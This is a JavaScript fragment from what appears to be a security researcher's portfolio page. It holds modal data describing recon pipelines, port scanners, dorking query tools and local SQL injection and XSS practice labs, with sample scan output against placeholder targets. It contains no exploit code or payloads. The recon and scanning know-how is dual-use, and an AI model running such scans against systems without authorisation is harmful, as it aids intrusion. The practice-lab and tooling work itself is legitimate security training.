    tModal.classList.add('open');
    document.body.style.overflow = 'hidden';
    tModal.scrollTop = 0;
  }

  function closeTool() {
    tOverlay.classList.remove('open');
    tModal.classList.remove('open');
    document.body.style.overflow = '';
  }

  // ── Project Modal ──
  const projectData = {
    'bbrecon': {
      emoji: '\u{1F6F0}\u{FE0F}', type: 'Bug Bounty / Pentesting \u00B7 Bash',
      name: 'Bug Bounty Recon Engine',
      glow: 'rgba(61,255,160,0.2)',
      overview: 'A self-contained Bash reconnaissance pipeline that automates the first mile of a bug bounty engagement \u2014 turning a single domain (or a list of them) into a structured, deduplicated attack-surface map. Wraps industry-standard tools (subfinder, httpx, nmap, katana, ffuf, gf, nuclei) into one checkpointed workflow that can be safely killed and resumed without redoing finished work.',
      features: [
        { icon: '\u{1F9EC}', text: '<strong>10-Phase Pipeline</strong> \u2014 subdomain enum &rarr; HTTP probing &rarr; port scan &rarr; URL/JS collection &rarr; fuzzing &rarr; parameter discovery &rarr; CI/CD exposure &rarr; Nuclei sweep &rarr; takeover checks.' },
        { icon: '\u{1F4BE}', text: '<strong>Resumable Checkpoints</strong> \u2014 every phase checkpoints on success; Ctrl+C saves state safely, <code>--resume</code> skips what already finished.' },
        { icon: '\u{1F5C2}\u{FE0F}', text: '<strong>Multi-Target Support</strong> \u2014 single domain, single IP, CIDR range, or a newline-delimited target list.' },
        { icon: '\u{1F510}', text: '<strong>Authenticated Recon</strong> \u2014 injects session cookies/headers into every downstream tool call; raw header values are never logged, only a session hash.' },
        { icon: '\u{1F3AF}', text: '<strong>Config Exposure &amp; Takeover Checks</strong> \u2014 flags exposed config files and CNAME-based subdomain takeover candidates.' },
        { icon: '\u{1F9F0}', text: '<strong>Graceful Degradation</strong> \u2014 missing optional tools are skipped with a warning, never a crash; cross-platform on Bash 3.2+.' },
      ],
      code: {
        label: 'recon_engine.sh \u2014 full scan',
        body: '<span class="cmd">./recon_engine.sh example.com</span>\n<span class="hi">[01] DISCOVER   subdomains: 47 found</span>\n<span class="hi">[02] PROBE      live hosts: 31</span>\n<span class="hi">[03] ENUMERATE  ports scanned</span>\n<span class="out">[06] DETECT     ffuf + config exposure check</span>\n<span class="warn">[09] COMPLETE   Nuclei sweep \u2014 3 medium, 1 high</span>\n<span class="hi">[\u2713]   Resumable checkpoint saved after every phase</span>'
      },
      stack: ['Bash', 'subfinder', 'httpx', 'nmap', 'katana', 'ffuf', 'nuclei'],
      github: 'https://github.com/bhaktabsharma/Bug-Bounty-Recon-Tool',
      status: 'Active'
    },
    'reconkit': {
      emoji: '\u{1F50D}', type: 'Penetration Testing \u00B7 Python v2.0',
      name: 'Automated Recon & Enumeration Toolkit v2.0',
      glow: 'rgba(61,255,160,0.18)',
      overview: 'A modular, professional-grade automated recon framework for authorised engagements. v2.0 ships with 6 active modules, stealth mode (capped threads + random jitter), passive recon via crt.sh and Wayback Machine, resume-from-checkpoint, YAML config file, and auto-generates a dark-theme HTML report after every scan.',
      features: [
        { icon: '\u{1F310}', text: '<strong>DNS Enumeration</strong> \u2014 A, AAAA, MX, NS, TXT, CNAME, SRV records \u00B7 PTR/reverse DNS \u00B7 DNSSEC check \u00B7 AXFR zone transfer attempt.' },
        { icon: '\u{1F6AA}', text: '<strong>Multi-threaded Port Scanner</strong> \u2014 TCP + optional UDP \u00B7 socket-based or nmap \u00B7 stealth mode \u00B7 CVE hint matching on 25+ vulnerable version strings.' },
        { icon: '\u{1F517}', text: '<strong>Subdomain Brute-Force + Passive</strong> \u2014 concurrent wordlist enumeration merged with crt.sh and Wayback Machine CDX API results.' },
        { icon: '\u{1F575}', text: '<strong>Web Fingerprinting</strong> \u2014 25+ tech signatures \u00B7 security header audit \u00B7 SSL/TLS analysis \u00B7 cookie flags \u00B7 robots.txt \u00B7 sitemap.' },
        { icon: '\u{1F4CB}', text: '<strong>Banner Grabbing + CVE Hints</strong> \u2014 service-specific probes for FTP, SSH, SMTP, Redis and more \u00B7 matches 25+ vulnerable version strings to known CVEs.' },
        { icon: '\u{1F4C4}', text: '<strong>HTML Report</strong> \u2014 dark-theme report auto-saved after every scan: stats grid, open ports, CVE hints, subdomains, tech stack, endpoint breakdown.' },
      ],
      code: {
        label: 'recon_v2/main.py \u2014 full scan',
        body: '<span class="cmd">python3 main.py -t 10.10.x.x --ports 1-65535 --threads 300</span>\n<span class="hi">[DNS]   A: 10.10.x.x  MX: mail.target.com  NS: ns1.target.com</span>\n<span class="hi">[PORTS] Open: 22/ssh  80/http  443/https  445/smb</span>\n<span class="warn">[CVE]   Apache 2.4.18 \u2192 CVE-2017-7679 applicable</span>\n<span class="hi">[SUBS]  Found: dev.target.com  vpn.target.com</span>\n<span class="hi">[\u2713]    Report: recon_10_10_x_x_20260519.html</span>'
      },
      stack: ['Python 3.8+', 'dnspython', 'requests', 'BeautifulSoup4', 'socket', 'threading', 'pyyaml', 'Jinja2'],
      github: 'https://github.com/bhaktabsharma/Automated-Recon-Enumeration-Toolkit',
      status: 'Active'
    },
    'sqlilab': {
      emoji: '\u{1F489}', type: 'Web App Security \u00B7 TypeScript',
      name: 'SQL Injection Practice Lab',
      glow: 'rgba(41,182,246,0.14)',
      overview: 'A full-stack SQL injection playground built for repeatable local practice \u2014 not a shared public target. React + TypeScript + Vite + Tailwind on the frontend, Node + Express + TypeScript on the backend, SQLite for storage. 53 labs span classic, blind, time-based, and second-order injection so every technique has a clean, resettable environment.',
      features: [
        { icon: '\u{1F489}', text: '<strong>53 Labs</strong> \u2014 classic, blind (boolean + time-based), UNION-based, and second-order SQL injection across difficulty tiers.' },
        { icon: '\u269B\u{FE0F}', text: '<strong>Full-Stack TypeScript</strong> \u2014 React + Vite + Tailwind frontend talking to a Node + Express API.' },
        { icon: '\u{1F4BE}', text: '<strong>SQLite-Backed</strong> \u2014 every lab runs against its own local database so state resets cleanly between attempts.' },
        { icon: '\u{1F3E0}', text: '<strong>Runs Entirely Local</strong> \u2014 no shared infrastructure, no rate limits, safe to hammer with payloads.' },
      ],
      code: {
        label: 'sql-injection-lab/ \u2014 quick start',
        body: '<span class="cmd">git clone https://github.com/bhaktabsharma/SQL-INJECTION-LAB</span>\n<span class="cmd">npm install && npm run dev</span>\n<span class="hi">[\u2713] Frontend \u2192 http://localhost:5173</span>\n<span class="out">[LABS] 53 ready \u00B7 classic \u00B7 blind \u00B7 time-based \u00B7 UNION</span>'
      },
      stack: ['React', 'TypeScript', 'Vite', 'Tailwind CSS', 'Node.js', 'Express', 'SQLite'],
      github: 'https://github.com/bhaktabsharma/SQL-INJECTION-LAB',
      status: 'Active'
    },
    'reconql': {
      emoji: '\u{1F50E}', type: 'Bug Bounty \u00B7 Recon \u00B7 JavaScript',
      name: 'ReconQL \u2014 Dorking & Recon Search Engine',
      glow: 'rgba(139,92,246,0.16)',
      overview: 'A Google-dorking recon search engine built for bug bounty hunting. 23 categories and 91 pre-built queries cover subdomain enumeration, API discovery, parameter discovery, exposed files, and login panels \u2014 no more hand-writing dork syntax mid-engagement. Ships as a static site.',
      features: [
        { icon: '\u{1F9E9}', text: '<strong>91 Pre-Built Queries</strong> \u2014 organised into 23 recon categories so the right dork is always one click away.' },
        { icon: '\u{1F310}', text: '<strong>Broad Coverage</strong> \u2014 subdomains, APIs, parameters, exposed files, login panels, and more.' },
        { icon: '\u26A1', text: '<strong>Zero Backend</strong> \u2014 pure static site, deployable anywhere, loads instantly.' },
        { icon: '\u2B50', text: '<strong>Live &amp; Starred</strong> \u2014 actively used in real recon workflows, not just a demo.' },
      ],
      code: {
        label: 'reconql \u2014 live',
        body: '<span class="cmt"># Static site, no install needed</span>\n<span class="hi">[\u2713] 23 categories \u00B7 91 queries indexed</span>\n<span class="cmd">search: site:target.com inurl:api</span>\n<span class="hi">\u2192 14 matching dork queries surfaced</span>'
      },
      stack: ['JavaScript', 'HTML/CSS', 'GitHub Pages', 'Google Dorking'],
      github: 'https://github.com/bhaktabsharma/Dorking-Recon-Search-Engine',
      status: 'Active'
    },
    'crawlspace': {
      emoji: '\u{1F577}\u{FE0F}', type: 'Bug Bounty \u00B7 Recon \u00B7 HTML/JS',
      name: 'Crawlspace \u2014 Attack Surface Discovery',
      glow: 'rgba(232,184,75,0.15)',
      overview: 'An attack-surface discovery taxonomy and query generator \u2014 13 groups and 72 categories of testable vulnerability classes, each paired with a ready-to-use dorking query so nothing gets missed while scoping a target during recon.',
      features: [
        { icon: '\u{1F5C2}\u{FE0F}', text: '<strong>72 Categories</strong> \u2014 organised across 13 attack-surface groups as a recon checklist.' },
        { icon: '\u2699\u{FE0F}', text: '<strong>Built-In Query Generator</strong> \u2014 every category pairs with a ready-made dork query.' },
        { icon: '\u{1F4E6}', text: '<strong>Dependency-Free</strong> \u2014 a single static page, no build step, no backend.' },
        { icon: '\u2705', text: '<strong>Nothing Missed</strong> \u2014 designed to be run through methodically at the start of every engagement.' },
      ],
      code: {
        label: 'crawlspace \u2014 taxonomy browser',
        body: '<span class="cmt"># Open index.html \u2014 no install</span>\n<span class="hi">[\u2713] 13 groups \u00B7 72 categories loaded</span>\n<span class="cmd">select: "IDOR candidates"</span>\n<span class="hi">\u2192 dork query generated for target scope</span>'
      },
      stack: ['HTML5', 'JavaScript', 'CSS', 'Static Site'],
      github: 'https://github.com/bhaktabsharma/Attack-Surface-Candidates-Discovery',
      status: 'Active'
    },
    'faultline': {
      emoji: '\u{1F578}\u{FE0F}', type: 'Web App Security \u00B7 Node.js',
      name: 'Faultline \u2014 Local Web Hacking Lab',
      glow: 'rgba(41,182,246,0.12)',
      overview: '36 hands-on web application vulnerability labs across easy, medium, and hard difficulty \u2014 built to practice against locally with zero cloud dependency and nothing leaving your machine. Includes a dark/light mode toggle for long practice sessions.',
      features: [
        { icon: '\u{1F9EA}', text: '<strong>36 Labs</strong> \u2014 spread across 3 difficulty tiers, from foundational to advanced.' },
        { icon: '\u{1F3E0}', text: '<strong>Fully Local</strong> \u2014 zero cloud dependency, safe to practice against without touching shared infrastructure.' },
        { icon: '\u{1F319}', text: '<strong>Dark/Light Mode</strong> \u2014 a practice environment built for long sessions.' },
        { icon: '\u{1F4E6}', text: '<strong>Self-Contained</strong> \u2014 clone, install, run \u2014 no external services required.' },
      ],
      code: {
        label: 'faultline/ \u2014 quick start',
        body: '<span class="cmd">git clone https://github.com/bhaktabsharma/Web-Hacking-Lab-local</span>\n<span class="cmd">cd Web-Hacking-Lab-local && npm install && npm start</span>\n<span class="hi">[\u2713] Faultline running \u2192 http://localhost:3000</span>\n<span class="out">[LABS] 36 loaded \u00B7 Easy \u00B7 Medium \u00B7 Hard</span>'
      },
      stack: ['Node.js', 'Express', 'JavaScript', 'HTML/CSS', 'Local-only'],
      github: 'https://github.com/bhaktabsharma/Web-Hacking-Lab-local',
      status: 'Active'
    },
    'casefile': {
      emoji: '\u{1F5C2}\u{FE0F}', type: 'Security Knowledgebase \u00B7 JavaScript',
      name: 'CaseFile \u2014 Personal Security Wiki',
      glow: 'rgba(61,255,160,0.14)',
      overview: 'A personal security knowledgebase and wiki \u2014 979 topics organised into 16 categories, with full methodology write-ups (56 written so far) covering techniques, tools, and lessons learned across labs and engagements, structured for fast recall mid-engagement.',
      features: [
        { icon: '\u{1F5C3}\u{FE0F}', text: '<strong>979 Topics</strong> \u2014 organised across 16 categories spanning the full offensive security lifecycle.' },
        { icon: '\u{1F4DD}', text: '<strong>56 Write-Ups</strong> \u2014 full methodology documentation and growing.' },
        { icon: '\u{1F50D}', text: '<strong>Built for Recall</strong> \u2014 structured to be searched quickly during a live engagement, not browsed for leisure.' },
        { icon: '\u{1F5C4}\u{FE0F}', text: '<strong>A Personal Reference</strong> \u2014 curated notes, not a public wiki mirror.' },
      ],
      code: {
        label: 'casefile \u2014 search',
        body: '<span class="cmt"># Open index.html \u2014 no install</span>\n<span class="hi">[\u2713] 979 topics indexed \u00B7 16 categories</span>\n<span class="cmd">search: "kerberoasting"</span>\n<span class="hi">\u2192 1 write-up match found</span>'
      },
      stack: ['JavaScript', 'HTML/CSS', 'Static Site', 'Knowledgebase'],
      github: 'https://github.com/bhaktabsharma/CaseFile',
      status: 'Active'
    },
    'xsslab': {
      emoji: '\u{1F41B}', type: 'Web App Security \u00B7 React / Vue / Next.js',
      name: 'XSS Bugs Lab',
      glow: 'rgba(139,92,246,0.14)',
      overview: 'A cross-site scripting practice lab covering 72 labs across reflected, stored, and DOM-based XSS \u2014 deliberately vulnerable React, Vue, and Next.js environments with SQLite-backed progress tracking, so each framework\u2019s own XSS quirks get proper practice.',
      features: [
        { icon: '\u{1F41B}', text: '<strong>72 Labs</strong> \u2014 spanning reflected, stored, and DOM-based XSS.' },
        { icon: '\u269B\u{FE0F}', text: '<strong>Three Frameworks</strong> \u2014 deliberately vulnerable React, Vue, and Next.js targets.' },
        { icon: '\u{1F4C8}', text: '<strong>Progress Tracking</strong> \u2014 SQLite-backed so progress persists across sessions.' },
        { icon: '\u{1F9E9}', text: '<strong>Framework-Specific Quirks</strong> \u2014 covers the different XSS surfaces each stack introduces.' },
      ],
      code: {
        label: 'xss-bugs-lab/ \u2014 quick start',
        body: '<span class="cmd">git clone https://github.com/bhaktabsharma/XSS-Bugs-Lab</span>\n<span class="cmd">npm install && npm run dev</span>\n<span class="hi">[\u2713] 72 labs loaded \u00B7 React \u00B7 Vue \u00B7 Next.js</span>\n<span class="out">[DB] progress tracked in local SQLite</span>'
      },
      stack: ['React', 'Vue', 'Next.js', 'JavaScript', 'SQLite'],
      github: 'https://github.com/bhaktabsharma/XSS-Bugs-Lab',
      status: 'Active'
    }
  };

  const pOverlay = document.getElementById('pOverlay');
  const pModal   = document.getElementById('pModal');
  const pBody    = document.getElementById('pModalBody');

  function openProject(card) {
    const id = card.dataset.project;
    const d  = projectData[id];
    if (!d) return;

    document.getElementById('pModalEmoji').textContent = d.emoji;
    document.getElementById('pModalBanner').style.setProperty('--project-glow', d.glow);

    const features = d.features.map(f =>
      `<div class="pmodal-feature"><span style="font-size:1rem;flex-shrink:0;margin-top:1px">${f.icon}</span><span>${f.text}</span></div>`
    ).join('');
    const stack = d.stack.map(t => `<span class="tag">${t}</span>`).join('');
    const statusColor = d.status === 'Ongoing' ? 'var(--gold)' : '#3dffa0';

    pBody.innerHTML = `
      <div class="pmodal-type">${d.type}</div>
      <div class="pmodal-title">${d.name}</div>
      <p class="pmodal-overview">${d.overview}</p>

      <span class="pmodal-section-title">▸ Key Features</span>
      <div class="pmodal-features">${features}</div>

      <span class="pmodal-section-title">▸ Sample Output</span>
      <div class="pmodal-code">
        <div class="pmodal-code-header">
          <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
          <span>${d.code.label}</span>
        </div>
        <pre>${d.code.body}</pre>
      </div>

      <span class="pmodal-section-title">▸ Tech Stack</span>
      <div class="pmodal-stack">${stack}</div>

      <span class="pmodal-section-title">▸ Status</span>
      <div style="margin-bottom:1.8rem;font-family:'JetBrains Mono',monospace;font-size:0.78rem;color:${statusColor};display:flex;align-items:center;gap:8px">
        <span style="width:8px;height:8px;border-radius:50%;background:${statusColor};display:inline-block;box-shadow:0 0 8px ${statusColor}"></span>
        ${d.status}
      </div>

      <div class="pmodal-links">
        <a href="${d.github}" target="_blank" class="pmodal-link">🐙 &nbsp; View on GitHub</a>
        <a href="#writeups" onclick="closeProject()" class="pmodal-link secondary">📝 &nbsp; Read Writeup</a>
      </div>
    `;

    pOverlay.classList.add('open');
    pModal.classList.add('open');
    document.body.style.overflow = 'hidden';
    pModal.scrollTop = 0;
  }

  function closeProject() {
    pOverlay.classList.remove('open');
    pModal.classList.remove('open');
    document.body.style.overflow = '';
  }

  // ── Repo Modal ──
  const repoData = {
    'bbrecon': {
      name: 'Bug-Bounty-Recon-Tool', lang: 'Shell', dot: '#89e051',
      stars: 0, forks: 0, status: 'Active',
      desc: 'Bug Bounty Recon Engine \u2014 a 10-phase Bash reconnaissance pipeline. Subdomain enum, HTTP probing, port scanning, URL/JS collection, fuzzing, parameter discovery, CI/CD exposure, Nuclei sweep, and takeover checks, with resumable checkpoints.',
      features: [
        { icon: '\u{1F9EC}', text: '<strong>10-Phase Pipeline</strong> \u2014 subdomain enum through Nuclei vulnerability sweep.' },
        { icon: '\u{1F4BE}', text: '<strong>Resumable</strong> \u2014 every phase checkpoints; <code>--resume</code> skips finished work.' },
        { icon: '\u{1F5C2}\u{FE0F}', text: '<strong>Multi-Target</strong> \u2014 domain, IP, CIDR range, or target list.' },
        { icon: '\u{1F510}', text: '<strong>Authenticated Recon</strong> \u2014 session headers threaded through every tool, never logged raw.' },
      ],
      code: {
        label: './recon_engine.sh <target>',
        body: '<span class="cmd">./recon_engine.sh example.com</span>\n<span class="hi">[01] DISCOVER   subdomains: 47 found</span>\n<span class="hi">[02] PROBE      live hosts: 31</span>\n<span class="warn">[09] COMPLETE   Nuclei sweep \u2014 3 medium, 1 high</span>'
      },
      github: 'https://github.com/bhaktabsharma/Bug-Bounty-Recon-Tool',
      tags: ['Bash', 'subfinder', 'httpx', 'nmap', 'katana', 'ffuf', 'nuclei', 'Recon']
    },
    'faultline': {
      name: 'Web-Hacking-Lab-local', lang: 'JavaScript', dot: '#f1e05a',
      stars: 0, forks: 0, status: 'Active',
      desc: 'Faultline — 36 self-hosted web application vulnerability labs across easy, medium, and hard difficulty. Zero cloud dependency, dark/light mode, runs entirely on localhost.',
      features: [
        { icon: '\u{1F9EA}', text: '<strong>36 Labs</strong> \u2014 3 difficulty tiers, easy to hard.' },
        { icon: '\u{1F3E0}', text: '<strong>Fully Local</strong> \u2014 no cloud dependency, safe to practice against.' },
        { icon: '\u{1F319}', text: '<strong>Dark/Light Mode</strong> \u2014 built for long practice sessions.' },
        { icon: '\u{1F4E6}', text: '<strong>Self-Contained</strong> \u2014 clone, install, run.' },
      ],
      code: {
        label: 'npm install && npm start',
        body: '<span class="cmd">git clone https://github.com/bhaktabsharma/Web-Hacking-Lab-local</span>\n<span class="cmd">npm install && npm start</span>\n<span class="hi">[\u2713] http://localhost:3000 \u00B7 36 labs loaded</span>'
      },
      github: 'https://github.com/bhaktabsharma/Web-Hacking-Lab-local',
      tags: ['Node.js', 'Express', 'JavaScript', 'Web App Security', 'Local Lab']
    },
    'sqlilab': {
      name: 'SQL-INJECTION-LAB', lang: 'TypeScript', dot: '#3178c6',
      stars: 0, forks: 0, status: 'Active',
      desc: 'Full-stack SQL injection playground — React + TypeScript + Vite + Tailwind frontend, Node + Express + TypeScript backend, SQLite storage. 53 labs across classic, blind, time-based, and second-order injection.',
      features: [
        { icon: '\u{1F489}', text: '<strong>53 Labs</strong> \u2014 classic, blind, time-based, UNION-based, second-order.' },
        { icon: '\u269B\u{FE0F}', text: '<strong>Full-Stack TS</strong> \u2014 React/Vite/Tailwind + Express API.' },
        { icon: '\u{1F4BE}', text: '<strong>SQLite-Backed</strong> \u2014 clean reset between attempts.' },
        { icon: '\u{1F3E0}', text: '<strong>Runs Local</strong> \u2014 no shared infra, no rate limits.' },
      ],
      code: {
        label: 'npm install && npm run dev',
        body: '<span class="cmd">git clone https://github.com/bhaktabsharma/SQL-INJECTION-LAB</span>\n<span class="cmd">npm install && npm run dev</span>\n<span class="hi">[\u2713] http://localhost:5173 \u00B7 53 labs ready</span>'
      },
      github: 'https://github.com/bhaktabsharma/SQL-INJECTION-LAB',
      tags: ['React', 'TypeScript', 'Vite', 'Tailwind', 'Node.js', 'Express', 'SQLite']
    },
    'reconql': {
      name: 'Dorking-Recon-Search-Engine', lang: 'JavaScript', dot: '#f1e05a',
      stars: 1, forks: 0, status: 'Active',
      desc: 'ReconQL — Google dorking recon search engine for bug bounty hunting. 23 categories, 91 pre-built queries covering subdomains, APIs, parameters, exposed files, and login panels. Static site.',
      features: [
        { icon: '\u{1F9E9}', text: '<strong>91 Queries</strong> \u2014 across 23 recon categories.' },
        { icon: '\u{1F310}', text: '<strong>Broad Coverage</strong> \u2014 subdomains, APIs, parameters, exposed files.' },
        { icon: '\u26A1', text: '<strong>Zero Backend</strong> \u2014 static site, loads instantly.' },
        { icon: '\u2B50', text: '<strong>Live &amp; Starred</strong> \u2014 used in real recon workflows.' },
      ],
      code: {
        label: 'static site \u2014 no install',
        body: '<span class="hi">[\u2713] 23 categories \u00B7 91 queries indexed</span>\n<span class="cmd">search: site:target.com inurl:api</span>\n<span class="hi">\u2192 14 matching queries</span>'
      },
      github: 'https://github.com/bhaktabsharma/Dorking-Recon-Search-Engine',
      tags: ['JavaScript', 'Google Dorking', 'Recon', 'Bug Bounty', 'Static Site']
    },
    'reconkit': {
      name: 'Automated-Recon-Enumeration-Toolkit', lang: 'Python', dot: '#3572A5',
      stars: 1, forks: 0, status: 'Active',
      desc: 'Modular automated recon framework v2.0 for authorised engagements. 6 active modules: DNS enumeration, multi-threaded port scanning, subdomain brute-force (+ passive via crt.sh), web fingerprinting with 25+ tech signatures, WHOIS/ASN, and banner grabbing with CVE hints. Outputs a dark-theme HTML report after every scan.',
      features: [
        { icon: '\u{1F310}', text: '<strong>DNS Enumeration</strong> \u2014 A, MX, NS, TXT, CNAME, SRV, DNSSEC, AXFR zone transfer.' },
        { icon: '\u{1F6AA}', text: '<strong>Port Scanner</strong> \u2014 multi-threaded TCP + UDP \u00B7 nmap integration \u00B7 stealth mode \u00B7 CVE hints.' },
        { icon: '\u{1F517}', text: '<strong>Subdomain BF + Passive</strong> \u2014 wordlist + crt.sh + Wayback Machine sources merged and deduplicated.' },
        { icon: '\u{1F4C4}', text: '<strong>HTML Report</strong> \u2014 dark-theme report: ports, CVE hints, subdomains, tech stack, endpoint breakdown.' },
      ],
      code: {
        label: 'python3 main.py -t target --ports 1-65535',
        body: '<span class="cmd">python3 main.py -t 10.10.x.x --ports 1-65535 --threads 300</span>\n<span class="hi">[+] Open: 22/ssh  80/http  445/smb</span>\n<span class="warn">[CVE] Apache 2.4.18 \u2192 CVE-2017-7679</span>\n<span class="hi">[\u2713] Report: recon_10_10_x_x_20260519.html</span>'
      },
      github: 'https://github.com/bhaktabsharma/Automated-Recon-Enumeration-Toolkit',
      tags: ['Python', 'DNS', 'Port Scanner', 'Subdomain', 'Recon', 'HTML Report', 'Pentesting']
    },
    'crawlspace': {
      name: 'Attack-Surface-Candidates-Discovery', lang: 'HTML', dot: '#e34c26',
      stars: 0, forks: 0, status: 'Active',
      desc: 'Crawlspace — attack-surface discovery taxonomy and query generator. 13 groups, 72 categories of testable vulnerability classes, each paired with a ready-made dorking query.',
      features: [
        { icon: '\u{1F5C2}\u{FE0F}', text: '<strong>72 Categories</strong> \u2014 across 13 attack-surface groups.' },
        { icon: '\u2699\u{FE0F}', text: '<strong>Query Generator</strong> \u2014 built into every category.' },
        { icon: '\u{1F4E6}', text: '<strong>Dependency-Free</strong> \u2014 single static page.' },
        { icon: '\u2705', text: '<strong>Recon Checklist</strong> \u2014 run methodically per engagement.' },
      ],
      code: {
        label: 'static site \u2014 no install',
        body: '<span class="hi">[\u2713] 13 groups \u00B7 72 categories loaded</span>\n<span class="cmd">select: "IDOR candidates"</span>\n<span class="hi">\u2192 dork query generated</span>'
      },
      github: 'https://github.com/bhaktabsharma/Attack-Surface-Candidates-Discovery',
      tags: ['HTML5', 'JavaScript', 'Recon', 'Bug Bounty', 'Static Site']
    },
    'casefile': {
      name: 'CaseFile', lang: 'JavaScript', dot: '#f1e05a',
      stars: 0, forks: 0, status: 'Active',
      desc: 'Personal security knowledgebase and wiki — 979 topics across 16 categories, 56 full methodology write-ups and growing. Built for fast recall mid-engagement.',
      features: [
        { icon: '\u{1F5C3}\u{FE0F}', text: '<strong>979 Topics</strong> \u2014 across 16 categories.' },
        { icon: '\u{1F4DD}', text: '<strong>56 Write-Ups</strong> \u2014 full methodology, growing.' },
        { icon: '\u{1F50D}', text: '<strong>Built for Recall</strong> \u2014 fast search during live work.' },
        { icon: '\u{1F5C4}\u{FE0F}', text: '<strong>Personal Reference</strong> \u2014 curated, not a public mirror.' },
      ],
      code: {
        label: 'static site \u2014 no install',
        body: '<span class="hi">[\u2713] 979 topics indexed \u00B7 16 categories</span>\n<span class="cmd">search: "kerberoasting"</span>\n<span class="hi">\u2192 1 write-up match found</span>'
      },
      github: 'https://github.com/bhaktabsharma/CaseFile',
      tags: ['JavaScript', 'Knowledgebase', 'Documentation', 'Static Site']
    },
    'xsslab': {
      name: 'XSS-Bugs-Lab', lang: 'JavaScript', dot: '#f1e05a',
      stars: 0, forks: 0, status: 'Active',
      desc: 'XSS practice lab — 72 labs across reflected, stored, and DOM-based XSS in deliberately vulnerable React, Vue, and Next.js environments with SQLite-backed progress tracking.',
      features: [
        { icon: '\u{1F41B}', text: '<strong>72 Labs</strong> \u2014 reflected, stored, DOM-based XSS.' },
        { icon: '\u269B\u{FE0F}', text: '<strong>3 Frameworks</strong> \u2014 React, Vue, Next.js targets.' },
        { icon: '\u{1F4C8}', text: '<strong>Progress Tracking</strong> \u2014 SQLite-backed, persists across sessions.' },
        { icon: '\u{1F9E9}', text: '<strong>Framework Quirks</strong> \u2014 covers each stack\u2019s own XSS surface.' },
      ],
      code: {
        label: 'npm install && npm run dev',
        body: '<span class="cmd">git clone https://github.com/bhaktabsharma/XSS-Bugs-Lab</span>\n<span class="cmd">npm install && npm run dev</span>\n<span class="hi">[\u2713] 72 labs loaded \u00B7 React \u00B7 Vue \u00B7 Next.js</span>'
      },
      github: 'https://github.com/bhaktabsharma/XSS-Bugs-Lab',
      tags: ['React', 'Vue', 'Next.js', 'JavaScript', 'SQLite', 'XSS']
    }
  };
